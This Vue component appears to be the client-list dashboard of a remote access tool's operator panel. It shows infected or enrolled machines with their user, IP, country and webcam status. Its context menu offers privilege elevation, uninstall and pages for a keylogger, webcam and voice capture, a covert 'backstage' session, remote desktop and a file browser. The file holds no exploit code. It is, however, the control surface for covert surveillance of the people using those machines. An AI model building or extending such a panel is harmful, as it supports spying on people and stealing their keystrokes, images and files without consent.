<script setup lang="ts">
import { ref, computed, onMounted, onUnmounted } from "vue";
import { useRouter } from "vue-router";
import { clientApi, groupApi } from "@/api/client";
import type { Client, Group } from "@/api/types";
import AppSelect from "../components/ui/AppSelect.vue";
import { useWebSocket } from "@/composables/useWebSocket";
import { useUiStore } from "@/stores/ui";
import { timeAgo } from "@/lib/format";
import { CLIENT_MENU_GROUPS } from "@/lib/constants";

const router = useRouter();
const ui = useUiStore();
const { status: wsStatus, connect: wsConnect, disconnect: wsDisconnect } = useWebSocket();

const clients = ref<Client[]>([]);
const groups = ref<Group[]>([]);
const total = ref(0);
const onlineCount = ref(0);
const page = ref(1);
const pageSize = ref(24);
const loading = ref(true);
const search = ref("");
const statusFilter = ref("");
const osFilter = ref("");
const groupFilter = ref("");
const webcamFilter = ref("");
const tagFilter = ref("");
const sortBy = ref("last_seen_desc");
const layout = ref<"cards" | "rows" | "table">("rows");

const totalPages = computed(() => Math.max(1, Math.ceil(total.value / pageSize.value)));

const ctxMenu = ref<{ show: boolean; x: number; y: number; client: Client | null }>({
  show: false, x: 0, y: 0, client: null,
});

function displayName(c: Client): string {
  return c.nickname || c.host || c.id;
}

function userLine(c: Client): string {
  return c.user || c.host || c.id;
}

function osIcon(os: string) {
  const l = os?.toLowerCase() || "";
  if (l.includes("windows")) return "fa-brands fa-windows";
  if (l.includes("linux")) return "fa-brands fa-linux";
  if (l.includes("mac") || l.includes("darwin")) return "fa-brands fa-apple";
  return "fa-solid fa-circle";
}

function pingClass(ping?: number): string {
  if (!ping) return "";
  if (ping < 100) return "ping-good";
  if (ping < 300) return "ping-mid";
  return "ping-bad";
}

function handleWsMessage(data: Record<string, unknown>) {
  if (data.type === "clients_changed") { fetchClients(); return; }
  if (data.type !== "client_event") return;
  const evt = data as Record<string, unknown>;
  const clientId = evt.clientId as string;
  if (!clientId) return;
  if (evt.event === "client_online") {
    const idx = clients.value.findIndex((c) => c.id === clientId);
    if (idx < 0) { total.value++; onlineCount.value++; fetchClients(); }
  } else if (evt.event === "client_offline") {
    const idx = clients.value.findIndex((c) => c.id === clientId);
    if (idx >= 0) {
      clients.value[idx] = { ...clients.value[idx], online: false };
      onlineCount.value = Math.max(0, onlineCount.value - 1);
    }
  } else if (evt.event === "client_update") { fetchClients(); }
}

function connectDashboardWs() {
  const proto = location.protocol === "https:" ? "wss" : "ws";
  wsConnect(`${proto}://${location.host}/api/dashboard/ws`, handleWsMessage);
}

let debounceTimer: ReturnType<typeof setTimeout>;
function onSearch() {
  clearTimeout(debounceTimer);
  debounceTimer = setTimeout(() => { page.value = 1; fetchClients(); }, 300);
}

function resetAndFetch() { page.value = 1; fetchClients(); }

async function fetchClients() {
  loading.value = true;
  try {
    const params: Record<string, string> = {
      page: String(page.value), pageSize: String(pageSize.value), sort: sortBy.value,
    };
    if (search.value) params.search = search.value;
    if (statusFilter.value) params.status = statusFilter.value;
    if (osFilter.value) params.os = osFilter.value;
    if (groupFilter.value) params.group = groupFilter.value;
    if (webcamFilter.value) params.webcam = webcamFilter.value;
    if (tagFilter.value) params.tag = tagFilter.value;
    const res = await clientApi.list(params);
    clients.value = res.items || [];
    total.value = res.total;
    onlineCount.value = res.online;
  } catch { /* silent */ } finally { loading.value = false; }
}

async function fetchGroups() {
  try { groups.value = await groupApi.list(); } catch { /* silent */ }
}

async function removeClient(client: Client) {
  try {
    await clientApi.removeClient(client.id);
    clients.value = clients.value.filter((c) => c.id !== client.id);
    total.value = Math.max(0, total.value - 1);
    if (client.online) onlineCount.value = Math.max(0, onlineCount.value - 1);
    ui.toast(`Removed ${client.host} from dashboard`, "success");
  } catch (err: any) {
    ui.toast(err.message || "Failed to remove client", "error");
  }
}

function prevPage() { if (page.value > 1) { page.value--; fetchClients(); } }
function nextPage() { if (page.value < totalPages.value) { page.value++; fetchClients(); } }

function openClient(client: Client) {
  router.push({ name: "console", params: { id: client.id } });
}

function onContextMenu(e: MouseEvent, client: Client) {
  e.preventDefault();
  ctxMenu.value = { show: true, x: e.clientX, y: e.clientY, client };
}

function closeCtxMenu() { ctxMenu.value.show = false; }

function ctxAction(key: string) {
  const client = ctxMenu.value.client;
  if (!client) return;
  closeCtxMenu();

  const agentCommands = ["ping", "reconnect", "disconnect", "uninstall", "elevate"];
  if (agentCommands.includes(key)) {
    clientApi.command(client.id, key).then(() => {
      ui.toast(`Sent ${key} to ${client.host}`, "success");
      setTimeout(fetchClients, 1000);
    }).catch((err: Error) => ui.toast(err.message, "error"));
    return;
  }

  if (key === "console") router.push({ name: "console", params: { id: client.id } });
  else if (key === "remotedesktop") router.push({ name: "remotedesktop", params: { id: client.id } });
  else if (key === "backstage") router.push({ name: "backstage", params: { id: client.id } });
  else if (key === "webcam") router.push({ name: "webcam", params: { id: client.id } });
  else if (key === "keylogger") router.push({ name: "keylogger", params: { id: client.id } });
  else if (key === "processes") router.push({ name: "processes", params: { id: client.id } });
  else if (key === "filebrowser") router.push({ name: "filebrowser", params: { id: client.id } });
  else if (key === "voice") router.push({ name: "voice", params: { id: client.id } });
  else if (key === "winre") router.push({ name: "winre", params: { id: client.id } });
  else if (key === "remove-dashboard") removeClient(client);
}

onMounted(() => {
  fetchClients();
  fetchGroups();
  connectDashboardWs();
  document.addEventListener("click", closeCtxMenu);
});

onUnmounted(() => {
  wsDisconnect();
  document.removeEventListener("click", closeCtxMenu);
});
</script>

<template>
  <div class="dashboard">
    <!-- Header -->
    <div class="section-header">
      <h1 class="section-title">Clients</h1>
      <div class="header-meta">
        <span :class="['status-dot', wsStatus === 'connected' ? 'status-dot-online' : 'status-dot-offline']"></span>
        <span class="meta-count">{{ onlineCount }} <span class="meta-muted">/ {{ total }}</span></span>
      </div>
    </div>

    <!-- Toolbar -->
    <div class="toolbar">
      <div class="toolbar-filters">
        <input
          v-model="search" @input="onSearch" type="text"
          placeholder="Search..."
          class="input toolbar-search"
        />
        <AppSelect v-model="statusFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Status' }, { value: 'online', label: 'Online' }, { value: 'offline', label: 'Offline' }]" size="sm" style="width:130px" />
        <AppSelect v-model="osFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All OS' }, { value: 'windows', label: 'Windows' }, { value: 'linux', label: 'Linux' }, { value: 'darwin', label: 'macOS' }]" size="sm" style="width:120px" />
        <AppSelect v-model="groupFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Groups' }, ...groups.map(g => ({ value: g.name, label: g.name }))]" size="sm" style="width:140px" searchable />
        <AppSelect v-model="webcamFilter" @update:modelValue="resetAndFetch" :options="[{ value: '', label: 'All Webcams' }, { value: 'true', label: 'Has Webcam' }]" size="sm" style="width:130px" />
        <input v-model="tagFilter" @input="onSearch" placeholder="Filter by tag..." class="input toolbar-select" style="width:130px" />
        <AppSelect v-model="sortBy" @update:modelValue="resetAndFetch" :options="[{ value: 'last_seen_desc', label: 'Last Seen' }, { value: 'stable', label: 'Stable' }, { value: 'host_asc', label: 'Hostname A-Z' }, { value: 'ping_asc', label: 'Ping Low' }, { value: 'ping_desc', label: 'Ping High' }, { value: 'country_asc', label: 'Country' }, { value: 'group_asc', label: 'Group' }]" size="sm" style="width:130px" />
      </div>
      <div class="layout-toggle">
        <button @click="layout = 'cards'" :class="['layout-btn', layout === 'cards' && 'layout-btn-active']">
          <i class="fa-solid fa-grip"></i>
        </button>
        <button @click="layout = 'rows'" :class="['layout-btn', layout === 'rows' && 'layout-btn-active']">
          <i class="fa-solid fa-list"></i>
        </button>
        <button @click="layout = 'table'" :class="['layout-btn', layout === 'table' && 'layout-btn-active']">
          <i class="fa-solid fa-table"></i>
        </button>
      </div>
    </div>

    <!-- Loading / Empty -->
    <div v-if="loading" class="loading-state">
      <i class="fa-solid fa-spinner fa-spin"></i> Loading...
    </div>
    <div v-else-if="clients.length === 0" class="empty-state">
      No clients found.
    </div>

    <!-- Cards View -->
    <div v-else-if="layout === 'cards'" class="client-grid">
      <div
        v-for="c in clients" :key="c.id"
        class="client-card"
        :class="{ 'client-card-offline': !c.online }"
        :style="c.groupColor ? { '--group-color': c.groupColor } : {}"
        @click="openClient(c)" @contextmenu="onContextMenu($event, c)"
      >
        <div class="client-card-header">
          <span :class="['status-dot', c.online ? 'status-dot-online' : 'status-dot-offline']"></span>
          <span class="client-card-name">{{ displayName(c) }}</span>
          <span v-if="c.bookmarked" class="client-card-bookmark"><i class="fa-solid fa-star"></i></span>
        </div>
        <div class="client-card-meta">
          <div class="client-card-row">
            <i class="fa-solid fa-user"></i>
            <span class="truncate">{{ userLine(c) }}</span>
          </div>
          <div class="client-card-row">
            <i :class="osIcon(c.os)"></i>
            <span>{{ c.os }}</span>
          </div>
          <div class="client-card-row">
            <i class="fa-solid fa-globe"></i>
            <span>{{ c.country || "?" }}</span>
            <span class="client-card-ip">{{ c.ip || "" }}</span>
          </div>
          <div class="client-card-row" v-if="c.groupName">
            <i class="fa-solid fa-tag"></i>
            <span>{{ c.groupName }}</span>
          </div>
          <div class="client-card-ping" v-if="c.pingMs">
            <span :class="pingClass(c.pingMs)">{{ c.pingMs }}ms</span>
          </div>
        </div>
        <div class="client-card-footer">
          <span class="client-card-time">{{ timeAgo(c.lastSeen) }}</span>
          <div class="client-card-flags">
            <span v-if="c.webcamAvailable" class="client-flag" title="Webcam"><i class="fa-solid fa-video"></i></span>
            <span v-if="c.elevation" class="client-flag client-flag-elevated" :title="c.elevation">
              <i class="fa-solid fa-arrow-up-right-dots"></i>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Rows View -->
    <div v-else-if="layout === 'rows'" class="client-rows">
      <div
        v-for="c in clients" :key="c.id"
        class="cv-row"
        :class="{ 'cv-row-offline': !c.online }"
        :style="c.groupColor ? { '--group-color': c.groupColor } : {}"
        @click="openClient(c)" @contextmenu="onContextMenu($event, c)"
      >
        <span :class="['status-dot', c.online ? 'status-dot-online' : 'status-dot-offline']"></span>
        <span class="cv-row-name">{{ displayName(c) }}</span>
        <span class="cv-row-user">{{ userLine(c) }}</span>
        <span class="cv-row-os"><i :class="osIcon(c.os)"></i> {{ c.os }}</span>
        <span class="cv-row-country">{{ c.country || "" }}</span>
        <span class="cv-row-ip">{{ c.ip || "" }}</span>
        <span class="cv-row-ping" v-if="c.pingMs" :class="pingClass(c.pingMs)">{{ c.pingMs }}ms</span>
        <span class="cv-row-time">{{ timeAgo(c.lastSeen) }}</span>
      </div>
    </div>

    <!-- Table View -->
    <div v-else class="table-wrap">
      <table class="data-table">
        <thead>
          <tr>
            <th></th>
            <th>Hostname</th>
            <th>User</th>
            <th>OS</th>
            <th>Country</th>
            <th>IP</th>
            <th>Ping</th>
            <th>Version</th>
            <th>Group</th>
            <th>Last Seen</th>
          </tr>
        </thead>
        <tbody>
          <tr
            v-for="c in clients" :key="c.id"
            class="cv-table-row"
            :class="{ 'cv-row-offline': !c.online }"
            @click="openClient(c)" @contextmenu="onContextMenu($event, c)"
          >
            <td><span :class="['status-dot', c.online ? 'status-dot-online' : 'status-dot-offline']"></span></td>
            <td class="cv-table-name">{{ displayName(c) }}</td>
            <td>{{ userLine(c) }}</td>
            <td><i :class="osIcon(c.os)" class="mr-1"></i>{{ c.os }}</td>
            <td>{{ c.country || "" }}</td>
            <td class="font-mono text-xs">{{ c.ip || "" }}</td>
            <td :class="pingClass(c.pingMs)">{{ c.pingMs ? c.pingMs + 'ms' : '' }}</td>
            <td>{{ c.version || "" }}</td>
            <td v-if="c.groupName">
              <span class="badge badge-sm badge-primary">{{ c.groupName }}</span>
            </td>
            <td v-else></td>
            <td class="cv-table-time">{{ timeAgo(c.lastSeen) }}</td>
          </tr>
        </tbody>
      </table>
    </div>

    <!-- Pagination -->
    <div v-if="totalPages > 1" class="pagination">
      <span class="pagination-info">Page {{ page }} of {{ totalPages }}</span>
      <div class="pagination-btns">
        <button @click="prevPage" :disabled="page <= 1" class="btn btn-sm">
          <i class="fa-solid fa-chevron-left"></i> Prev
        </button>
        <button @click="nextPage" :disabled="page >= totalPages" class="btn btn-sm">
          Next <i class="fa-solid fa-chevron-right"></i>
        </button>
      </div>
    </div>

    <!-- Context Menu -->
    <Teleport to="body">
      <div
        v-if="ctxMenu.show"
        class="ctx-menu"
        :style="{ left: ctxMenu.x + 'px', top: ctxMenu.y + 'px' }"
        @click.stop
      >
        <div class="ctx-menu-header">{{ displayName(ctxMenu.client!) }}</div>
        <template v-for="group in CLIENT_MENU_GROUPS" :key="group.label">
          <div class="ctx-menu-label">{{ group.label }}</div>
          <button
            v-for="item in group.items"
            :key="item.key"
            @click="ctxAction(item.key)"
            class="ctx-menu-btn"
          >
            <i :class="[item.icon, item.color]" style="width:16px;text-align:center;font-size:12px"></i>
            <span>{{ item.label }}</span>
          </button>
        </template>
        <div class="ctx-menu-sep"></div>
        <div class="ctx-menu-label">Agent</div>
        <button @click="ctxAction('ping')" class="ctx-menu-btn">
          <i class="fa-solid fa-satellite-dish" style="width:16px;text-align:center;font-size:12px;color:#e2e8f0"></i>
          <span>Ping</span>
        </button>
        <button @click="ctxAction('reconnect')" class="ctx-menu-btn">
          <i class="fa-solid fa-rotate" style="width:16px;text-align:center;font-size:12px;color:#e2e8f0"></i>
          <span>Reconnect</span>
        </button>
        <button @click="ctxAction('elevate')" class="ctx-menu-btn">
          <i class="fa-solid fa-arrow-up-right-dots" style="width:16px;text-align:center;font-size:12px;color:#4ade80"></i>
          <span>Elevate</span>
        </button>
        <div class="ctx-menu-sep"></div>
        <button @click="ctxAction('disconnect')" class="ctx-menu-btn ctx-menu-btn-danger">
          <i class="fa-solid fa-plug-circle-xmark" style="width:16px;text-align:center;font-size:12px"></i>
          <span>Disconnect</span>
        </button>
        <button @click="ctxAction('uninstall')" class="ctx-menu-btn ctx-menu-btn-danger">
          <i class="fa-solid fa-trash" style="width:16px;text-align:center;font-size:12px"></i>
          <span>Uninstall</span>
        </button>
        <template v-if="ctxMenu.client && !ctxMenu.client.online">
          <div class="ctx-menu-sep"></div>
          <button @click="ctxAction('remove-dashboard')" class="ctx-menu-btn ctx-menu-btn-danger" style="color:#fda4af">
            <i class="fa-solid fa-user-xmark" style="width:16px;text-align:center;font-size:12px"></i>
            <span>Remove From Dashboard</span>
          </button>
        </template>
      </div>
    </Teleport>
  </div>
</template>

<style scoped>
.dashboard { }

.header-meta {
  display: flex; align-items: center; gap: 10px;
}
.meta-count {
  font-size: 0.875rem; font-weight: 500; color: #e8edf2;
}
.meta-muted {
  color: #64748b; font-weight: 400;
}

.toolbar {
  display: flex; flex-wrap: wrap; align-items: center; gap: 8px;
  margin-bottom: 16px;
}
.toolbar-filters {
  display: flex; flex-wrap: wrap; gap: 8px; flex: 1;
}
.toolbar-search {
  min-width: 180px; flex: 1;
}
.toolbar-select {
  min-width: 120px;
}
.layout-toggle {
  display: flex;
  border: 1px solid var(--cv-border);
  border-radius: 10px;
  overflow: hidden;
}
.layout-btn {
  width: 36px; height: 32px;
  display: flex; align-items: center; justify-content: center;
  background: var(--cv-bg);
  border: none; color: #64748b;
  font-size: 13px;
  transition: all 120ms ease;
}
.layout-btn:hover { color: #94a3b8; }
.layout-btn-active {
  background: var(--cv-surface2);
  color: #e2e8f0;
}

/* Cards Grid */
.client-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 12px;
}
.client-card {
  background: var(--cv-bg);
  border: 1px solid var(--cv-border);
  border-left: 3px solid var(--group-color, transparent);
  border-radius: 10px;
  padding: 14px 16px;
  cursor: pointer;
  transition: border-color 160ms ease, box-shadow 160ms ease, transform 160ms ease;
}
.client-card:hover {
  transform: translateY(-2px);
  border-color: var(--cv-border-strong);
  box-shadow: 0 8px 24px rgba(2, 6, 23, 0.35);
}
.client-card-offline {
  opacity: 0.65;
}
.client-card-header {
  display: flex; align-items: center; gap: 8px;
  margin-bottom: 10px;
}
.client-card-name {
  font-size: 0.875rem; font-weight: 600; color: #e8edf2;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  flex: 1;
}
.client-card-bookmark { color: #fbbf24; font-size: 11px; }

.client-card-meta {
  display: flex; flex-direction: column; gap: 4px;
  font-size: 12px; color: #9aa6bd;
}
.client-card-row {
  display: flex; align-items: center; gap: 8px;
}
.client-card-row i {
  width: 14px; text-align: center; color: #6b7488; font-size: 11px;
}
.client-card-ip {
  margin-left: auto; color: #6b7488;
}
.client-card-ping {
  font-size: 11px; margin-top: 2px;
}

.client-card-footer {
  display: flex; align-items: center; justify-content: space-between;
  margin-top: 10px; padding-top: 10px;
  border-top: 1px solid var(--cv-border);
}
.client-card-time {
  font-size: 11px; color: #6b7488;
}
.client-card-flags {
  display: flex; gap: 6px;
}
.client-flag {
  width: 20px; height: 20px;
  display: flex; align-items: center; justify-content: center;
  border-radius: 4px;
  font-size: 10px;
  background: rgba(255, 255, 255, 0.04);
  color: #94a3b8;
}
.client-flag-elevated {
  background: rgba(234,179,8,0.08); color: #fef08a;
  border: 1px solid rgba(234,179,8,0.22);
}

/* Rows */
.client-rows {
  display: flex; flex-direction: column; gap: 6px;
}
.cv-row {
  display: flex; align-items: center; gap: 14px;
  padding: 12px 22px 12px 25px;
  background: var(--cv-bg);
  border: 1px solid var(--cv-border);
  border-left: 3px solid var(--group-color, transparent);
  border-radius: 12px;
  cursor: pointer;
  transition: background-color 140ms ease, border-color 140ms ease;
  min-height: 52px;
}
.cv-row:hover {
  background: var(--cv-bg-hover);
  border-color: var(--cv-border-strong);
}
.cv-row-offline {
  opacity: 0.65;
}
.cv-row-name {
  width: 180px;
  font-size: 0.875rem; font-weight: 600; color: #e8edf2;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  flex-shrink: 0;
}
.cv-row-user {
  width: 140px; font-size: 12px; color: #9aa6bd;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  flex-shrink: 0;
}
.cv-row-os {
  width: 140px; font-size: 12px; color: #9aa6bd;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  flex-shrink: 0;
}
.cv-row-os i { margin-right: 6px; color: #6b7488; }
.cv-row-country {
  width: 80px; font-size: 12px; color: #6b7488;
  flex-shrink: 0;
}
.cv-row-ip {
  width: 120px; font-size: 12px; color: #6b7488;
  font-family: ui-monospace, monospace;
  flex-shrink: 0;
}
.cv-row-ping {
  width: 60px; font-size: 12px; text-align: right;
  flex-shrink: 0;
}
.cv-row-time {
  margin-left: auto;
  font-size: 12px; color: #6b7488;
  white-space: nowrap;
}

/* Table */
.cv-table-name {
  font-weight: 600; color: #e8edf2;
}
.cv-table-time {
  color: #6b748b; white-space: nowrap;
}
.cv-table-row {
  cursor: pointer;
}
.cv-row-offline td {
  opacity: 0.65;
}
</style>
